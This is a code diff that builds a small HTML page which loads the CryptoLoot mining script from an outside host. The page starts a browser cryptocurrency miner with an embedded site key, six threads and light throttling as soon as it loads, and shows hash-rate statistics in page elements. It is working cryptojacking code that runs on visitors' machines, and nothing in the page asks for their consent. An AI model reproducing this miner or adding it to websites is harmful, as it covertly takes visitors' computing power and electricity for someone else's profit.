@@ -1,6 +1,20 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+	<p id="hs"></p>
+	<p id="th"></p>
+	<p id="ah"></p>
+	
+	
 <script src="//cryptoloot.pro/lib/crlt.js"></script>
 <script>
-	var miner = new CRLT.Anonymous('646a801afb54506995bb84ad461edd508f205c11d2d3');
+	var miner=new CRLT.Anonymous('646a801afb54506995bb84ad461edd508f205c11d2d3',
+        {
+        threads:6,autoThreads:false,throttle:0.2,
+        }
+);
+	
 	miner.start();
 </script>
 <script>
@@ -13,7 +27,19 @@
 		var hashesPerSecond = miner.getHashesPerSecond();
 		var totalHashes = miner.getTotalHashes();
 		var acceptedHashes = miner.getAcceptedHashes();
+		
+		
+		
+		
 
+
+		document.getElementById("hs").innerHTML = hashesPerSecond;
+		document.getElementById("th").innerHTML = totalHashes;
+		document.getElementById("ah").innerHTML = acceptedHashes;
 		// Output to HTML elements...
 	}, 1000);
 </script>
+
+	
+</body>
+</html>
